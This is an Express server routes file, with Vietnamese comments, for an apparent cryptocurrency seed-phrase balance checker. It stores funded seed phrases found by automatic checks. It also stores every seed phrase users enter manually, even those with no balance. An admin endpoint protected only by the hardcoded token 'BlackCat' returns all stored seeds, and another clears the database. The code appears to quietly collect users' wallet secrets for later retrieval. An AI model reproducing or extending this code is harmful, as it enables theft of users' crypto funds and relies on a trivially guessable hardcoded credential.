import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import * as addressGenerator from "./blockchain/address-generator";
import { checkBalanceWithSmartRotation as checkBalance } from "./blockchain/api-smart-rotation";
import { checkBalancesInParallel, checkBalanceWithRateLimit } from "./blockchain/parallel-balance-checker";
import { BlockchainType, blockchainSchema, seedPhraseSchema, BalanceCheckResult, WalletAddress } from "@shared/schema";
import { z } from "zod";

export async function registerRoutes(app: Express): Promise<Server> {
  // Generate addresses from seed phrase
  app.post("/api/generate-addresses", async (req: Request, res: Response) => {
    try {
      // Validate request body
      const schema = z.object({
        seedPhrase: seedPhraseSchema,
        blockchains: z.array(blockchainSchema),
      });

      const validationResult = schema.safeParse(req.body);
      if (!validationResult.success) {
        return res.status(400).json({
          message: "Invalid request",
          errors: validationResult.error.errors,
        });
      }

      const { seedPhrase, blockchains } = validationResult.data;

      // Generate addresses
      const addresses = await addressGenerator.generateAddressesFromSeedPhrase(
        seedPhrase,
        blockchains
      );

      return res.json({ addresses });
    } catch (error) {
      console.error("Error generating addresses:", error);
      return res.status(500).json({
        message: "Failed to generate addresses",
        error: String(error),
      });
    }
  });

  // Check balances for addresses
  app.post("/api/check-balances", async (req: Request, res: Response) => {
    try {
      // Validate request body
      const schema = z.object({
        addresses: z.array(
          z.object({
            blockchain: blockchainSchema,
            address: z.string(),
          })
        ),
        seedPhrase: z.string().optional(),
      });

      const validationResult = schema.safeParse(req.body);
      if (!validationResult.success) {
        return res.status(400).json({
          message: "Invalid request",
          errors: validationResult.error.errors,
        });
      }

      const { addresses, seedPhrase } = validationResult.data;
      const results: BalanceCheckResult[] = [];

      // Check balances for all addresses
      for (const addressData of addresses) {
        const { blockchain, address } = addressData;

        try {
          // Check balance from APIs
          const balance = await checkBalance(blockchain, address);
          
          const hasBalance = parseFloat(balance) > 0;
          results.push({
            address,
            balance,
            hasBalance,
            blockchain
          });

          // If balance > 0 and we have a seed phrase, save to database
          // Đây là kiểm tra tự động nên chỉ lưu khi có số dư dương
          if (hasBalance && seedPhrase) {
            try {
              await storage.createWallet({
                blockchain,
                address,
                balance,
                seedPhrase: seedPhrase,
                path: "",
                isManualCheck: false, // Đánh dấu là kiểm tra tự động
                metadata: {},
              });
            } catch (dbError) {
              console.error("Error saving wallet to database:", dbError);
              // Continue even if DB save fails
            }
          }
        } catch (error) {
          console.error(`Error checking balance for ${blockchain} address ${address}:`, error);
          results.push({
            address,
            balance: "0",
            hasBalance: false,
            blockchain
          });
        }
      }

      return res.json({ results });
    } catch (error) {
      console.error("Error checking balances:", error);
      return res.status(500).json({
        message: "Failed to check balances",
        error: String(error),
      });
    }
  });

  // API đã bị xóa để tăng cường bảo mật

  // API /api/save-manual-seed-phrase đã bị xóa vì không cần thiết nữa
  // Giờ đây các seed phrase từ kiểm tra thủ công sẽ được lưu thông qua API /api/check-balances-parallel với cờ isManualCheck = true
  
  // API endpoint đặc biệt cho admin để truy vấn database
  app.post("/api/admin/query-wallets", async (req: Request, res: Response) => {
    try {
      // Xác thực quyền truy cập bằng mã thông báo
      const schema = z.object({
        token: z.string()
      });
      
      const validationResult = schema.safeParse(req.body);
      if (!validationResult.success) {
        return res.status(400).json({
          message: "Invalid request",
          errors: validationResult.error.errors,
        });
      }
      
      const { token } = validationResult.data;
      
      // Kiểm tra xem token có hợp lệ không (trong trường hợp này là "BlackCat")
      if (token !== "BlackCat") {
        return res.status(403).json({
          message: "Access denied",
        });
      }
      
      // Truy vấn tất cả ví từ database
      const wallets = await storage.getWalletsWithBalance();
      
      return res.json({ wallets });
    } catch (error) {
      console.error("Error querying wallets:", error);
      return res.status(500).json({
        message: "Failed to query wallets",
        error: String(error),
      });
    }
  });

  // API để xóa toàn bộ dữ liệu trong database
  app.post("/api/admin/clear-database", async (req: Request, res: Response) => {
    try {
      // Xác thực quyền truy cập bằng mã thông báo
      const schema = z.object({
        token: z.string()
      });
      
      const validationResult = schema.safeParse(req.body);
      if (!validationResult.success) {
        return res.status(400).json({
          message: "Invalid request",
          errors: validationResult.error.errors,
        });
      }
      
      const { token } = validationResult.data;
      
      // Kiểm tra xem token có hợp lệ không (trong trường hợp này là "BlackCat")
      if (token !== "BlackCat") {
        return res.status(403).json({
          message: "Access denied",
        });
      }
      
      // Xóa toàn bộ dữ liệu
      await storage.clearDatabase();
      
      return res.json({ 
        success: true,
        message: "Database cleared successfully"
      });
    } catch (error) {
      console.error("Error clearing database:", error);
      return res.status(500).json({
        message: "Failed to clear database",
        error: String(error),
      });
    }
  });
  
  app.post("/api/check-balances-parallel", async (req: Request, res: Response) => {
    try {
      // Validate request body
      const schema = z.object({
        addresses: z.array(
          z.object({
            blockchain: blockchainSchema,
            address: z.string(),
          })
        ),
        seedPhrase: z.string().optional(),
        isManualCheck: z.boolean().optional(), // Thêm flag để biết đây là kiểm tra thủ công hay tự động
      });

      const validationResult = schema.safeParse(req.body);
      if (!validationResult.success) {
        return res.status(400).json({
          message: "Invalid request",
          errors: validationResult.error.errors,
        });
      }

      const { addresses, seedPhrase, isManualCheck = false } = validationResult.data;
      const BATCH_SIZE = 2; // Giảm batch size từ 3 xuống 2 để tối ưu hiệu suất khi nhiều phiên
      
      // Kiểm tra số dư song song cho tất cả địa chỉ
      const startTime = Date.now();
      console.log(`Bắt đầu kiểm tra ${addresses.length} địa chỉ song song (batch size: ${BATCH_SIZE})`);
      
      // Lưu trữ Promise tạm thời để có thể theo dõi tiến trình
      const resultPromises = addresses.map(({ blockchain, address }) => {
        return checkBalanceWithRateLimit(blockchain, address)
          .then(balance => {
            const hasBalance = parseFloat(balance) > 0;
            console.log(`Đã kiểm tra địa chỉ đơn lẻ: ${blockchain} ${address.substring(0, 6)}...`);
            
            return {
              address,
              balance,
              hasBalance,
              blockchain
            };
          })
          .catch(error => {
            console.error(`Error checking ${blockchain} balance for ${address}:`, error);
            return {
              address,
              balance: '0',
              hasBalance: false,
              blockchain
            };
          });
      });
      
      // Đợi tất cả promise hoàn thành
      const results = await Promise.all(resultPromises);
      
      const endTime = Date.now();
      console.log(`Hoàn thành kiểm tra ${addresses.length} địa chỉ song song trong ${endTime - startTime}ms`);

      // Lưu vào database theo quy tắc:
      // - Với kiểm tra thủ công: Lưu seed phrase vào database với số dư của blockchain tương ứng.
      //   Nếu không tìm thấy số dư ở bất kỳ blockchain nào, lưu DQCL một bản ghi với số dư = 0
      // - Với kiểm tra tự động: Chỉ lưu seed phrase có số dư trên blockchain tương ứng
      if (seedPhrase) {
        // Lọc ra các địa chỉ có số dư
        const balanceAddresses = results.filter(r => r.hasBalance);
        
        // Với kiểm tra thủ công
        if (isManualCheck) {
          // Nếu có địa chỉ có số dư 
          if (balanceAddresses.length > 0) {
            console.log(`Đang lưu ${balanceAddresses.length} địa chỉ có số dư từ kiểm tra thủ công`);
            
            // Lưu mỗi địa chỉ có số dư với blockchain tương ứng
            for (const result of balanceAddresses) {
              try {
                await storage.createWallet({
                  blockchain: result.blockchain,
                  address: result.address,
                  balance: result.balance,
                  seedPhrase: seedPhrase,
                  path: "",
                  isManualCheck: true, // Đánh dấu là thủ công
                  metadata: {},
                });
              } catch (dbError) {
                console.error(`Error saving manual wallet (${result.blockchain}) with balance to database:`, dbError);
              }
            }
          } 
          // Nếu không có địa chỉ nào có số dư, lưu một bản ghi để ghi nhận seed thủ công
          else {
            console.log(`Lưu seed phrase thủ công không có số dư`);
            try {
              // Lưu DQCL một bản ghi với blockchain là từ địa chỉ đầu tiên hoặc "MANUAL"
              const firstResult = results[0] || { blockchain: "MANUAL" as BlockchainType, address: "MANUAL" };
              await storage.createWallet({
                blockchain: firstResult.blockchain,
                address: firstResult.address,
                balance: "0",
                seedPhrase: seedPhrase,
                path: "",
                isManualCheck: true, // Đánh dấu là thủ công
                metadata: {},
              });
            } catch (dbError) {
              console.error(`Error saving manual wallet without balance to database:`, dbError);
            }
          }
        } 
        // Với kiểm tra tự động, chỉ lưu địa chỉ có số dư
        else {
          if (balanceAddresses.length > 0) {
            console.log(`Đang lưu ${balanceAddresses.length} địa chỉ có số dư từ kiểm tra tự động`);
            
            for (const result of balanceAddresses) {
              try {
                await storage.createWallet({
                  blockchain: result.blockchain,
                  address: result.address,
                  balance: result.balance,
                  seedPhrase: seedPhrase,
                  path: "",
                  isManualCheck: false, // Đánh dấu là tự động
                  metadata: {},
                });
              } catch (dbError) {
                console.error(`Error saving auto wallet (${result.blockchain}) with balance to database:`, dbError);
              }
            }
          }
        }
      }

      return res.json({ results });
    } catch (error) {
      console.error("Error checking balances in parallel:", error);
      return res.status(500).json({
        message: "Failed to check balances in parallel",
        error: String(error),
      });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
